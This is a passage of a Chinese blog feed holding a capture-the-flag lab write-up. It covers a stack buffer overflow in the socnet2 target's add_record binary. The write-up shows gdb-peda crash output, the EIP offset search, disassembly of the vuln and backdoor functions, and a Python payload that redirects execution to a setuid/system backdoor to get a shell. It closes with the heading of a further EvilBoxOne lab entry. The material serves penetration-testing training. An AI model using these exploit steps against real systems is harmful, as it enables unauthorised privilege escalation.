(&#x27;A&#x27; &lt;repeats <span class="number">200</span> times&gt;...)</span><br><span class="line"><span class="attribute">EIP</span>: <span class="number">0</span>x<span class="number">41414141</span> (&#x27;AAAA&#x27;)</span><br><span class="line"><span class="attribute">EFLAGS</span>: <span class="number">0</span>x<span class="number">10286</span> (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)<span class="meta"></span></span><br><span class="line"><span class="meta">[-------------------------------------code-------------------------------------]</span></span><br><span class="line"><span class="attribute">Invalid</span> $PC address: <span class="number">0</span>x<span class="number">41414141</span><span class="meta"></span></span><br><span class="line"><span class="meta">[------------------------------------stack-------------------------------------]</span></span><br><span class="line"><span class="attribute">0000</span>| <span class="number">0</span>xffffdc<span class="number">50</span> (&#x27;A&#x27; &lt;repeats <span class="number">200</span> times&gt;...)</span><br><span class="line"><span class="attribute">0004</span>| <span class="number">0</span>xffffdc<span class="number">54</span> (&#x27;A&#x27; &lt;repeats <span class="number">200</span> times&gt;...)</span><br><span class="line"><span class="attribute">0008</span>| <span class="number">0</span>xffffdc<span class="number">58</span> (&#x27;A&#x27; &lt;repeats <span class="number">200</span> times&gt;...)</span><br><span class="line"><span class="attribute">0012</span>| <span class="number">0</span>xffffdc<span class="number">5</span>c (&#x27;A&#x27; &lt;repeats <span class="number">200</span> times&gt;...)</span><br><span class="line"><span class="attribute">0016</span>| <span class="number">0</span>xffffdc<span class="number">60</span> (&#x27;A&#x27; &lt;repeats <span class="number">200</span> times&gt;...)</span><br><span class="line"><span class="attribute">0020</span>| <span class="number">0</span>xffffdc<span class="number">64</span> (&#x27;A&#x27; &lt;repeats <span class="number">200</span> times&gt;...)</span><br><span class="line"><span class="attribute">0024</span>| <span class="number">0</span>xffffdc<span class="number">68</span> (&#x27;A&#x27; &lt;repeats <span class="number">200</span> times&gt;...)</span><br><span class="line"><span class="attribute">0028</span>| <span class="number">0</span>xffffdc<span class="number">6</span>c (&#x27;A&#x27; &lt;repeats <span class="number">200</span> times&gt;...)<span class="meta"></span></span><br><span class="line"><span class="meta">[------------------------------------------------------------------------------]</span></span><br><span class="line"><span class="attribute">Legend</span>: code, data, rodata, value</span><br><span class="line"><span class="attribute">Stopped</span> reason: SIGSEGV</span><br><span class="line"><span class="attribute">0x41414141</span> in ?? (</span><br></pre></td></tr></table></figure>

<p>缓冲区溢出需要重点关注EIP这个寄存器（<code>EIP: 0x41414141 (&#39;AAAA&#39;)</code> ）。EIP保存的数值是CPU接下来需要执行指令的内存地址编号。我们需要确定EIP中的4个A究竟是哪4个A。将这四个A替换成payload的内存地址，就可以执行payload。</p>
<h3 id="gdb特征字符"><a href="#gdb特征字符" class="headerlink" title="gdb特征字符"></a>gdb特征字符</h3><p>通过修改AAA的数量，确定字符小于100也能造成缓冲区溢出。</p>
<p>通过gdb生成特征字符（每四个字符都不一样）</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">gdb<span class="operator">-</span>peda$ <span class="keyword">pattern</span> <span class="keyword">create</span> <span class="number">100</span></span><br><span class="line"><span class="keyword">pattern</span> <span class="keyword">create</span> <span class="number">100</span></span><br><span class="line"><span class="string">&#x27;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&#x27;</span></span><br></pre></td></tr></table></figure>

<p>放置到Explain里面执行</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">gdb</span>-peda$ r</span><br><span class="line"><span class="attribute">r</span></span><br><span class="line"><span class="attribute">Starting</span> program: /home/socnet/add_record</span><br><span class="line"><span class="attribute">Welcome</span> to Add Record application</span><br><span class="line"><span class="attribute">Use</span> it to add info about Social Network <span class="number">2</span>.<span class="number">0</span> Employees</span><br><span class="line"><span class="attribute">Employee</span> Name(char): a</span><br><span class="line"><span class="attribute">a</span></span><br><span class="line"><span class="attribute">Years</span> worked(int): <span class="number">1</span></span><br><span class="line"><span class="attribute">1</span></span><br><span class="line"><span class="attribute">Salary</span>(int): <span class="number">1</span></span><br><span class="line"><span class="attribute">1</span></span><br><span class="line"><span class="attribute">Ever</span> got in trouble? <span class="number">1</span> (yes) or <span class="number">0</span> (no): <span class="number">1</span></span><br><span class="line"><span class="attribute">1</span></span><br><span class="line"><span class="attribute">Explain</span>: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA<span class="number">0</span>AAFAAbAA<span class="number">1</span>AAGAAcAA<span class="number">2</span>AAHAAdAA<span class="number">3</span>AAIAAeAA<span class="number">4</span>AAJAAfAA<span class="number">5</span>AAKAAgAA<span class="number">6</span>AAL</span><br><span class="line"><span class="attribute">AAA</span>%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA<span class="number">0</span>AAFAAbAA<span class="number">1</span>AAGAAcAA<span class="number">2</span>AAHAAdAA<span class="number">3</span>AAIAAeAA<span class="number">4</span>AAJAAfAA<span class="number">5</span>AAKAAgAA<span class="number">6</span>AAL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">EIP</span>: <span class="number">0</span>x<span class="number">41414841</span> (&#x27;AHAA&#x27;)</span><br><span class="line"></span><br><span class="line"><span class="attribute">0x41414841</span> in ?? ()</span><br></pre></td></tr></table></figure>

<p>EIP的结果是<code>EIP: 0x41414841 (&#39;AHAA&#39;)</code></p>
<h3 id="使用gdb-patter-search"><a href="#使用gdb-patter-search" class="headerlink" title="使用gdb patter search"></a>使用gdb patter search</h3><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">gdb-peda$ pattern search</span><br><span class="line">pattern search</span><br><span class="line">Registers contain pattern buffer:</span><br><span class="line"><span class="built_in">EBX</span>+<span class="number">0</span> found <span class="meta">at</span> offset: <span class="number">54</span></span><br><span class="line"><span class="built_in">EBP</span>+<span class="number">0</span> found <span class="meta">at</span> offset: <span class="number">58</span></span><br><span class="line"><span class="built_in">EIP</span>+<span class="number">0</span> found <span class="meta">at</span> offset: <span class="number">62</span></span><br><span class="line">Registers point to pattern buffer:</span><br><span class="line">[<span class="built_in">EAX</span>] --&gt; offset <span class="number">0</span> - size ~<span class="number">100</span></span><br><span class="line">[<span class="built_in">ESP</span>] --&gt; offset <span class="number">66</span> - size ~<span class="number">34</span></span><br><span class="line">Pattern buffer found <span class="meta">at</span>:</span><br><span class="line"><span class="number">0x0804a6d0</span> : offset    <span class="number">0</span> - size  <span class="number">100</span> ([heap])</span><br><span class="line"><span class="number">0xffffdc0e</span> : offset    <span class="number">0</span> - size  <span class="number">100</span> ($<span class="built_in">sp</span> + -<span class="number">0x42</span> [-<span class="number">17</span> dwords])</span><br><span class="line"><span class="number">0xffffdc73</span> : offset    <span class="number">7</span> - size   <span class="number">93</span> ($<span class="built_in">sp</span> + <span class="number">0x23</span> [<span class="number">8</span> dwords])</span><br><span class="line">References to pattern buffer found <span class="meta">at</span>:</span><br><span class="line"><span class="number">0xf7fc25cc</span> : <span class="number">0x0804a6d0</span> (/lib32/libc-<span class="number">2.27</span><span class="number">.</span>so)</span><br><span class="line"><span class="number">0xf7fc25d0</span> : <span class="number">0x0804a6d0</span> (/lib32/libc-<span class="number">2.27</span><span class="number">.</span>so)</span><br><span class="line"><span class="number">0xf7fc25d4</span> : <span class="number">0x0804a6d0</span> (/lib32/libc-<span class="number">2.27</span><span class="number">.</span>so)</span><br><span class="line"><span class="number">0xf7fc25d8</span> : <span class="number">0x0804a6d0</span> (/lib32/libc-<span class="number">2.27</span><span class="number">.</span>so)</span><br><span class="line"><span class="number">0xf7fc25dc</span> : <span class="number">0x0804a6d0</span> (/lib32/libc-<span class="number">2.27</span><span class="number">.</span>so)</span><br><span class="line"><span class="number">0xffffd558</span> : <span class="number">0x0804a6d0</span> ($<span class="built_in">sp</span> + -<span class="number">0x6f8</span> [-<span class="number">446</span> dwords])</span><br><span class="line"><span class="number">0xffffdbd8</span> : <span class="number">0xffffdc0e</span> ($<span class="built_in">sp</span> + -<span class="number">0x78</span> [-<span class="number">30</span> dwords])</span><br><span class="line"><span class="number">0xffffdbf0</span> : <span class="number">0xffffdc0e</span> ($<span class="built_in">sp</span> + -<span class="number">0x60</span> [-<span class="number">24</span> dwords])</span><br><span class="line"><span class="number">0xf7ea0037</span> : <span class="number">0xffffdc73</span> (/lib32/libc-<span class="number">2.27</span><span class="number">.</span>so)</span><br></pre></td></tr></table></figure>

<p>重点关注<code>EIP+0 found at offset: 62</code>，他的偏移量是62，也就是说从63个字符开始，就会进入EIP寄存器中。</p>
<p>按照推断，我们生成62个A，再加上4个其他字符，那边EIP就是我们指定的4个字符了</p>
<p>还是使用python生成：</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@kali</span> ~]<span class="meta"># python -c <span class="string">&quot;print(&#x27;A&#x27;*62 + &#x27;BCDE&#x27;)&quot;</span></span></span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDE</span><br></pre></td></tr></table></figure>



<p>gdb执行</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">r</span><br><span class="line">Starting program: /home/socnet/add_record</span><br><span class="line">Welcome to Add Record application</span><br><span class="line">Use it to add info about Social Network 2.0 Employees</span><br><span class="line">Employee Name(char): 1</span><br><span class="line">1</span><br><span class="line"><span class="code">......</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code">EIP: 0x45444342 (&#x27;BCDE&#x27;)</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code">......</span></span><br><span class="line">EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line"></span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure>



<p>验证猜想成功，就是BCDE。</p>
<p><code>EIP: 0x45444342 (&#39;BCDE&#39;)</code></p>
<p>42表示B的ASCII编码，43表示D，44表示C，45表示B。</p>
<h3 id="GDB调试"><a href="#GDB调试" class="headerlink" title="GDB调试"></a>GDB调试</h3><p>查看main函数的汇编指令。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">gdb-peda$ disas main</span><br><span class="line">disas main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   <span class="number">0x080486d8</span> &lt;+<span class="number">0</span>&gt;:	<span class="keyword">lea</span>    <span class="built_in">ecx</span>,[<span class="built_in">esp</span>+<span class="number">0x4</span>]</span><br><span class="line">.....</span><br><span class="line">   <span class="number">0x08048729</span> &lt;+<span class="number">81</span>&gt;:	<span class="keyword">call</span>   <span class="number">0x8048520</span> &lt;fopen@plt&gt;</span><br><span class="line">......</span><br><span class="line">   <span class="number">0x0804873d</span> &lt;+<span class="number">101</span>&gt;:	<span class="keyword">push</span>   <span class="built_in">eax</span></span><br><span class="line">   <span class="number">0x0804873e</span> &lt;+<span class="number">102</span>&gt;:	<span class="keyword">call</span>   <span class="number">0x80484e0</span> &lt;puts@plt&gt;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>其中call，是调用函数fopen, @plt是指c语言内建函数。</p>
<p>puts是函数一般输出一些内容，通过Printf的内建函数输出结果。为了验证猜测，我们可以在put函数之前<code>0x0804873d</code>打个断点。</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">gdb</span>-peda$ break *<span class="number">0</span>x<span class="number">0804873</span>d</span><br><span class="line"><span class="attribute">break</span> *<span class="number">0</span>x<span class="number">0804873</span>d</span><br><span class="line"><span class="attribute">Breakpoint</span> <span class="number">1</span> at <span class="number">0</span>x<span class="number">804873</span>d</span><br></pre></td></tr></table></figure>

<p>执行</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">gdb-peda$ run</span><br><span class="line">run</span><br><span class="line">Starting program: /home/socnet/add_record</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line"><span class="symbol">EAX:</span> <span class="number">0x8048974</span> (<span class="string">&quot;Welcome to Add Record application\nUse it to add info about Social Network 2.0 Employees&quot;</span>)</span><br><span class="line"><span class="symbol">EBX:</span> <span class="number">0x8049d48</span> --&gt; <span class="number">0x8049c58</span> --&gt; <span class="number">0x1</span></span><br><span class="line"><span class="symbol">ECX:</span> <span class="number">0xffffffff</span></span><br><span class="line"><span class="symbol">EDX:</span> <span class="number">0xffffffff</span></span><br><span class="line"><span class="symbol">ESI:</span> <span class="number">0xf7fc2000</span> --&gt; <span class="number">0x1d4d6c</span></span><br><span class="line"><span class="symbol">EDI:</span> <span class="number">0xffffdcd0</span> --&gt; <span class="number">0x8</span></span><br><span class="line"><span class="symbol">EBP:</span> <span class="number">0xffffdd18</span> --&gt; <span class="number">0x0</span></span><br><span class="line"><span class="symbol">ESP:</span> <span class="number">0xffffdc54</span> --&gt; <span class="number">0x804895a</span> --&gt; <span class="number">0x6d650061</span> (<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="symbol">EIP:</span> <span class="number">0x804873d</span> (&lt;main+<span class="number">101</span>&gt;:	<span class="keyword">push</span>   <span class="built_in">eax</span>)</span><br><span class="line"><span class="symbol">EFLAGS:</span> <span class="number">0x292</span> (carry parity ADJUST <span class="meta">zero</span> SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   <span class="number">0x8048731</span> &lt;main+<span class="number">89</span>&gt;:	<span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x1c</span>],<span class="built_in">eax</span></span><br><span class="line">   <span class="number">0x8048734</span> &lt;main+<span class="number">92</span>&gt;:	<span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0xc</span></span><br><span class="line">   <span class="number">0x8048737</span> &lt;main+<span class="number">95</span>&gt;:	<span class="keyword">lea</span>    <span class="built_in">eax</span>,[<span class="built_in">ebx</span>-<span class="number">0x13d4</span>]</span><br><span class="line">=&gt; <span class="number">0x804873d</span> &lt;main+<span class="number">101</span>&gt;:	<span class="keyword">push</span>   <span class="built_in">eax</span></span><br><span class="line">   <span class="number">0x804873e</span> &lt;main+<span class="number">102</span>&gt;:	<span class="keyword">call</span>   <span class="number">0x80484e0</span> &lt;puts@plt&gt;</span><br><span class="line">   <span class="number">0x8048743</span> &lt;main+<span class="number">107</span>&gt;:	<span class="keyword">add</span>    <span class="built_in">esp</span>,<span class="number">0x10</span></span><br><span class="line">   <span class="number">0x8048746</span> &lt;main+<span class="number">110</span>&gt;:	<span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0xc</span></span><br><span class="line">   <span class="number">0x8048749</span> &lt;main+<span class="number">113</span>&gt;:	<span class="keyword">lea</span>    <span class="built_in">eax</span>,[<span class="built_in">ebx</span>-<span class="number">0x137c</span>]</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line"><span class="number">0000</span>| <span class="number">0xffffdc54</span> --&gt; <span class="number">0x804895a</span> --&gt; <span class="number">0x6d650061</span> (<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="number">0004</span>| <span class="number">0xffffdc58</span> --&gt; <span class="number">0x0</span></span><br><span class="line"><span class="number">0008</span>| <span class="number">0xffffdc5c</span> --&gt; <span class="number">0x80486f4</span> (&lt;main+<span class="number">28</span>&gt;:	<span class="keyword">add</span>    <span class="built_in">ebx</span>,<span class="number">0x1654</span>)</span><br><span class="line"><span class="number">0012</span>| <span class="number">0xffffdc60</span> --&gt; <span class="number">0x0</span></span><br><span class="line"><span class="number">0016</span>| <span class="number">0xffffdc64</span> --&gt; <span class="number">0x0</span></span><br><span class="line"><span class="number">0020</span>| <span class="number">0xffffdc68</span> --&gt; <span class="number">0xc2</span></span><br><span class="line"><span class="number">0024</span>| <span class="number">0xffffdc6c</span> --&gt; <span class="number">0x414e</span> (<span class="string">&#x27;NA&#x27;</span>)</span><br><span class="line"><span class="number">0028</span>| <span class="number">0xffffdc70</span> --&gt; <span class="number">0x0</span></span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line"><span class="symbol">Legend:</span> code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">1</span>, <span class="number">0x0804873d</span> <span class="keyword">in</span> main ()</span><br></pre></td></tr></table></figure>

<p>输入s单步执行</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">gdb</span>-peda$ s</span><br><span class="line"><span class="attribute">s</span><span class="meta"></span></span><br><span class="line"><span class="meta">[----------------------------------registers-----------------------------------]</span></span><br><span class="line"><span class="attribute">EAX</span>: <span class="number">0</span>x<span class="number">8048974</span> (<span class="string">&quot;Welcome to Add Record application\nUse it to add info about Social Network 2.0 Employees&quot;</span>)</span><br><span class="line"><span class="attribute">EBX</span>: <span class="number">0</span>x<span class="number">8049</span>d<span class="number">48</span> --&gt; <span class="number">0</span>x<span class="number">8049</span>c<span class="number">58</span> --&gt; <span class="number">0</span>x<span class="number">1</span></span><br><span class="line"><span class="attribute">ECX</span>: <span class="number">0</span>xffffffff</span><br><span class="line"><span class="attribute">EDX</span>: <span class="number">0</span>xffffffff</span><br></pre></td></tr></table></figure>

<p>可以看到EAX就是puts函数的内容。</p>
<p>删除断点</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">gdb<span class="literal">-peda</span><span class="variable">$</span> <span class="built_in">del</span> <span class="number">1</span></span><br><span class="line"><span class="built_in">del</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>





<p>查看所有函数函数</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">info</span> func</span><br></pre></td></tr></table></figure>



<p>查看vuln函数</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">gdb-peda$ disas vuln</span><br><span class="line">disas vuln</span><br><span class="line">Dump of assembler code for function vuln:</span><br><span class="line">   <span class="number">0x080486ad</span> &lt;+<span class="number">0</span>&gt;:	<span class="keyword">push</span>   <span class="built_in">ebp</span></span><br><span class="line">   <span class="number">0x080486ae</span> &lt;+<span class="number">1</span>&gt;:	<span class="keyword">mov</span>    <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line">   <span class="number">0x080486b0</span> &lt;+<span class="number">3</span>&gt;:	<span class="keyword">push</span>   <span class="built_in">ebx</span></span><br><span class="line">   <span class="number">0x080486b1</span> &lt;+<span class="number">4</span>&gt;:	<span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0x44</span></span><br><span class="line">   <span class="number">0x080486b4</span> &lt;+<span class="number">7</span>&gt;:	<span class="keyword">call</span>   <span class="number">0x80488c2</span> &lt;__x86<span class="number">.</span>get_pc_thunk<span class="number">.</span><span class="built_in">ax</span>&gt;</span><br><span class="line">   <span class="number">0x080486b9</span> &lt;+<span class="number">12</span>&gt;:	<span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="number">0x168f</span></span><br><span class="line">   <span class="number">0x080486be</span> &lt;+<span class="number">17</span>&gt;:	<span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0x8</span></span><br><span class="line">   <span class="number">0x080486c1</span> &lt;+<span class="number">20</span>&gt;:	<span class="keyword">push</span>   <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>+<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x080486c4</span> &lt;+<span class="number">23</span>&gt;:	<span class="keyword">lea</span>    <span class="built_in">edx</span>,[<span class="built_in">ebp</span>-<span class="number">0x3a</span>]</span><br><span class="line">   <span class="number">0x080486c7</span> &lt;+<span class="number">26</span>&gt;:	<span class="keyword">push</span>   <span class="built_in">edx</span></span><br><span class="line">   <span class="number">0x080486c8</span> &lt;+<span class="number">27</span>&gt;:	<span class="keyword">mov</span>    <span class="built_in">ebx</span>,<span class="built_in">eax</span></span><br><span class="line">   <span class="number">0x080486ca</span> &lt;+<span class="number">29</span>&gt;:	<span class="keyword">call</span>   <span class="number">0x80484d0</span> &lt;strcpy@plt&gt;</span><br><span class="line">   <span class="number">0x080486cf</span> &lt;+<span class="number">34</span>&gt;:	<span class="keyword">add</span>    <span class="built_in">esp</span>,<span class="number">0x10</span></span><br><span class="line">   <span class="number">0x080486d2</span> &lt;+<span class="number">37</span>&gt;:	<span class="keyword">nop</span></span><br><span class="line">   <span class="number">0x080486d3</span> &lt;+<span class="number">38</span>&gt;:	<span class="keyword">mov</span>    <span class="built_in">ebx</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x4</span>]</span><br><span class="line">   <span class="number">0x080486d6</span> &lt;+<span class="number">41</span>&gt;:	<span class="keyword">leave</span></span><br><span class="line">   <span class="number">0x080486d7</span> &lt;+<span class="number">42</span>&gt;:	<span class="keyword">ret</span></span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>



<p>调用了<code>0x80484d0 &lt;strcpy@plt&gt;</code>，strcpy函数存在缓冲区溢出漏洞</p>
<p>查看backdoor函数</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">gdb-peda$ disas backdoor</span><br><span class="line">disas backdoor</span><br><span class="line">Dump of assembler code for function backdoor:</span><br><span class="line">   <span class="number">0x08048676</span> &lt;+<span class="number">0</span>&gt;:	<span class="keyword">push</span>   <span class="built_in">ebp</span></span><br><span class="line">   <span class="number">0x08048677</span> &lt;+<span class="number">1</span>&gt;:	<span class="keyword">mov</span>    <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line">   <span class="number">0x08048679</span> &lt;+<span class="number">3</span>&gt;:	<span class="keyword">push</span>   <span class="built_in">ebx</span></span><br><span class="line">   <span class="number">0x0804867a</span> &lt;+<span class="number">4</span>&gt;:	<span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0x4</span></span><br><span class="line">   <span class="number">0x0804867d</span> &lt;+<span class="number">7</span>&gt;:	<span class="keyword">call</span>   <span class="number">0x80485b0</span> &lt;__x86<span class="number">.</span>get_pc_thunk<span class="number">.</span><span class="built_in">bx</span>&gt;</span><br><span class="line">   <span class="number">0x08048682</span> &lt;+<span class="number">12</span>&gt;:	<span class="keyword">add</span>    <span class="built_in">ebx</span>,<span class="number">0x16c6</span></span><br><span class="line">   <span class="number">0x08048688</span> &lt;+<span class="number">18</span>&gt;:	<span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0xc</span></span><br><span class="line">   <span class="number">0x0804868b</span> &lt;+<span class="number">21</span>&gt;:	<span class="keyword">push</span>   <span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0804868d</span> &lt;+<span class="number">23</span>&gt;:	<span class="keyword">call</span>   <span class="number">0x8048530</span> &lt;setuid@plt&gt;</span><br><span class="line">   <span class="number">0x08048692</span> &lt;+<span class="number">28</span>&gt;:	<span class="keyword">add</span>    <span class="built_in">esp</span>,<span class="number">0x10</span></span><br><span class="line">   <span class="number">0x08048695</span> &lt;+<span class="number">31</span>&gt;:	<span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0xc</span></span><br><span class="line">   <span class="number">0x08048698</span> &lt;+<span class="number">34</span>&gt;:	<span class="keyword">lea</span>    <span class="built_in">eax</span>,[<span class="built_in">ebx</span>-<span class="number">0x13f8</span>]</span><br><span class="line">   <span class="number">0x0804869e</span> &lt;+<span class="number">40</span>&gt;:	<span class="keyword">push</span>   <span class="built_in">eax</span></span><br><span class="line">   <span class="number">0x0804869f</span> &lt;+<span class="number">41</span>&gt;:	<span class="keyword">call</span>   <span class="number">0x80484f0</span> &lt;system@plt&gt;</span><br><span class="line">   <span class="number">0x080486a4</span> &lt;+<span class="number">46</span>&gt;:	<span class="keyword">add</span>    <span class="built_in">esp</span>,<span class="number">0x10</span></span><br><span class="line">   <span class="number">0x080486a7</span> &lt;+<span class="number">49</span>&gt;:	<span class="keyword">nop</span></span><br><span class="line">   <span class="number">0x080486a8</span> &lt;+<span class="number">50</span>&gt;:	<span class="keyword">mov</span>    <span class="built_in">ebx</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x4</span>]</span><br><span class="line">   <span class="number">0x080486ab</span> &lt;+<span class="number">53</span>&gt;:	<span class="keyword">leave</span></span><br><span class="line">   <span class="number">0x080486ac</span> &lt;+<span class="number">54</span>&gt;:	<span class="keyword">ret</span></span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>



<p><code>0x8048530 &lt;setuid@plt&gt;</code>， <code>0x80484f0 &lt;system@plt&gt;</code>，这里明显存在可利用的点，我们可以在EIP注入backdoor的起始地址<code>0x08048676</code>，</p>
<h3 id="执行payload"><a href="#执行payload" class="headerlink" title="执行payload"></a>执行payload</h3><p>(在item2特殊字符有问题，换默认terminal就行了)</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">python <span class="operator">-</span>c <span class="string">&quot;import struct; print(&#x27;aa<span class="subst">\n</span>1<span class="subst">\n</span>1<span class="subst">\n</span>1<span class="subst">\n</span>&#x27; + &#x27;A&#x27;*62 + struct.pack(&#x27;I&#x27;, 0x08048676))&quot;</span> <span class="operator">&gt;</span> <span class="operator">/</span>tmp<span class="operator">/</span>payload.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[shadowflow<span class="meta">@ShadowOS</span> <span class="operator">~</span>]$ cat <span class="operator">/</span>tmp<span class="operator">/</span>payload.txt</span><br><span class="line">aa</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="type">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAv</span>?</span><br></pre></td></tr></table></figure>



<p>退出gdb。生成payload</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ q</span><br><span class="line">q</span><br><span class="line">socnet@socnet2:<span class="symbol">~$ python -c &quot;import struct</span>; print(&#x27;aa\n1\n1\n1\n&#x27; + &#x27;A&#x27;*<span class="number">62</span> + struct.pack(&#x27;I&#x27;, <span class="number">0</span>x08048676))<span class="string">&quot; &gt; /tmp/payload.txt</span></span><br><span class="line">&lt;+ struct.pack(&#x27;I&#x27;, <span class="number">0</span>x08048676))<span class="string">&quot; &gt; /tmp/payload.txt</span></span><br><span class="line">socnet@socnet2:<span class="symbol">~$ cat /tmp/payload.txt</span></span><br><span class="line"><span class="symbol">cat /tmp/payload.txt</span></span><br><span class="line"><span class="symbol">aa</span></span><br><span class="line"><span class="symbol">1</span></span><br><span class="line"><span class="symbol">1</span></span><br><span class="line"><span class="symbol">1</span></span><br><span class="line"><span class="symbol">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAv�</span></span><br></pre></td></tr></table></figure>

<p>重新进入gdb</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">socnet@socnet2:~$ gdb -q <span class="string">./add_record</span></span><br><span class="line">gdb -q <span class="string">./add_record</span></span><br><span class="line">Reading symbols from <span class="string">./add_record...</span><span class="params">(no debugging symbols found)</span><span class="string">...done</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行</p>
<figure class="highlight vhdl"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">gdb-peda$ r &lt; /tmp/payload.txt</span><br><span class="line">r &lt; /tmp/payload.txt</span><br><span class="line">Starting program: /home/socnet/add_record &lt; /tmp/payload.txt</span><br><span class="line">Welcome <span class="keyword">to</span> Add <span class="keyword">Record</span> application</span><br><span class="line"><span class="keyword">Use</span> it <span class="keyword">to</span> add info about Social Network <span class="number">2.0</span> Employees</span><br><span class="line">[<span class="keyword">New</span> <span class="keyword">process</span> <span class="number">18307</span>]</span><br><span class="line"><span class="keyword">process</span> <span class="number">18307</span> <span class="keyword">is</span> executing <span class="keyword">new</span> program: /bin/dash</span><br><span class="line">[<span class="keyword">New</span> <span class="keyword">process</span> <span class="number">18308</span>]</span><br><span class="line"><span class="keyword">process</span> <span class="number">18308</span> <span class="keyword">is</span> executing <span class="keyword">new</span> program: /bin/bash</span><br><span class="line">[Inferior <span class="number">3</span> (<span class="keyword">process</span> <span class="number">18308</span>) exited normally]</span><br><span class="line"><span class="literal">Warning</span>: <span class="keyword">not</span> running <span class="keyword">or</span> target <span class="keyword">is</span> remote</span><br></pre></td></tr></table></figure>

<p>可以看见先起了dash，又启动了bash。</p>
<p>经过不断调试分析，最终执行方式如下</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cat <span class="regexp">/tmp/</span>payload.txt - | ./add_record</span><br></pre></td></tr></table></figure>



















































]]></content>
      <categories>
        <category>红队技术</category>
      </categories>
      <tags>
        <tag>打靶</tag>
      </tags>
  </entry>
  <entry>
    <title>打靶练习6-EvilBoxOne</title>
    <url>/%E6%89%93%E9%9D%B6%E7%BB%83%E4%B9%A06-EvilBoxOne/</url>
    <content><![CDATA[<p>gobuster目录扫描 | ffuf参数fuzz | 文件包含 | php封装器 | ssh私钥读取 | ssh私钥爆破 | 写入/etc/passwd提权</p>
<span id="more"></span>




<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>ping网段</p>
